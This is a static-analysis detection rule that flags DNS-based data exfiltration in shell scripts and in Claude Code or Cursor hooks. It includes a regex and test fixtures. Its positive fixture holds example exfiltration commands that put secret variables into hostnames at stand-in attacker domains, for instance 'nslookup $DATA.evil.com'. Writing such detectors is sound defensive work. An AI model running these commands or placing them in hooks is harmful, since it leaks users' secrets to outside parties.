desc(
	mode: "source"
	language: "general"
	title: "Hooks DNS Exfiltration Generic"
	title_zh: "检测到Hooks DNS Exfiltration Generic",
	type: vuln
	level: critical
	rule_id: "source-config-hooks-dns-exfiltration-generic"
	risk: "information-exposure"
	desc: <<<DESC
### 规则说明
DNS lookup command uses a variable in the hostname, which could exfiltrate sensitive data via DNS queries. In Claude Code and Cursor hooks, this pattern can leak secrets or environment data to attacker-controlled domains. Use static hostnames only in DNS commands.

### 风险类型
敏感信息泄露（information-exposure）

### 影响
应用可能暴露内部路径、环境信息或敏感数据，攻击者可借此收集攻击面。

### 检测方式
Source 模式正则匹配，检测代码或配置中符合该风险模式的位置。

### 补充说明
False-positive hardening: hostname argument itself must start with $VAR/${VAR} after optional short flags; ignore help text like "endpoint host (default: $X)".

### 参考
- CWE: CWE-201: Insertion of Sensitive Information Into Sent Data
DESC
	solution: <<<SOLUTION
### 修复建议
限制敏感信息的输出范围，关闭不必要的调试接口，并对暴露内容进行脱敏。

推荐修复：
Use static hostnames only in DNS commands.
SOLUTION
	alert_min: 1
	"file://pos.sh": <<<POS
#!/bin/bash
ping -c 1 $SECRET.attacker.com
nslookup $DATA.evil.com
dig $EXFIL_DATA.example.com
host ${EXFIL}.evil.com
POS
	"safefile://neg.sh": <<<NEG
#!/bin/bash
ping -c 1 google.com
nslookup example.com
echo "  --analytics-host HOST           Analytics endpoint host (default: $ANALYTICS_HOST)"
echo "host HOST           Analytics endpoint host (default: $"
host
    if [ -z "$EMPTY" ]; then
      echo skip
    fi
NEG
)

${*.sh}.pattern_regex(/\b(ping|nslookup|dig|host)(?:[ \t]+-[a-zA-Z0-9]+(?:[ \t]+[0-9]+)?){0,5}[ \t]+\$\{?[A-Za-z_][A-Za-z0-9_]*/) as $p0
${*.bash}.pattern_regex(/\b(ping|nslookup|dig|host)(?:[ \t]+-[a-zA-Z0-9]+(?:[ \t]+[0-9]+)?){0,5}[ \t]+\$\{?[A-Za-z_][A-Za-z0-9_]*/) as $p1
$p0 + $p1 as $hit
alert $hit for {
	level: "critical",
	title: "Hooks DNS Exfiltration Generic",
	title_zh: "检测到Hooks DNS Exfiltration Generic",
	message: "Hooks DNS Exfiltration Generic",
}
